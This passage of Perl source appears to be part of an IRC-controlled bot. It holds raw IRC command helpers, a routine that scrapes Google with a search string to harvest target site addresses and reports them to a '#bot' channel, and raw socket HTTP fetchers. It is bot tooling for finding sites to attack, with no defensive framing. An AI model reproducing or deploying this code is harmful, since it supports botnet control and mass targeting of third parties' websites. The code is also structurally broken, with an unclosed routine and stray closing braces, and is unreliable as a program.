   sendraw("JOIN $_[0]");
}

#####################
#        CYCLE      #
#####################
sub cycle {
   return unless $#_ == 0;
   sendraw("CYCLE $_[0]");
}
#####################
#   END OF CYCLE    #
#####################

sub p {
   part(@_);
}

sub part {
   sendraw("PART $_[0]");
}

sub nick {
   return unless $#_ == 0;
   sendraw("NICK $_[0]");
}

######### test quit ##########
sub quit {
  sendraw("QUIT :$_[0]");
}
######### test quit ##########

###### test msg #######
sub msg {
  sendraw("PRIVMSG :$_[0] $_[1]");
}
###### test msg #######

sub fetch(){
   my $rnd=(int(rand(9999)));
   my $n= 80;
   if ($rnd<5000) {
      $n<<=1;
   }
   my $s= (int(rand(10)) * $n);
   my @dominios = ("removed-them-all");
   my @str;
   foreach $dom  (@dominios){
      push (@str,"@gstring");
   }
   my $query="www.google.com/search?q=";
   $query.=$str[(rand(scalar(@str)))];
   $query.="&num=$n&start=$s";
   my @lst=();
   sendraw("privmsg #bot :DEBUG only test googling: ".$query."");
   my $page = http_query($query);
   while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"? class=l>/g){
      if ($1 !~ m/google|cache|translate/){
         push (@lst,$1);
      }
   }
   return (@lst);

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}   
return @unici;
}

sub http_query($){
my ($url) = @_;
my $host=$url;
my $query=$url;
my $page="";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~s/$host//;
if ($query eq "") {$query="/";};
eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
};
return $page;
}
}
}
}
}
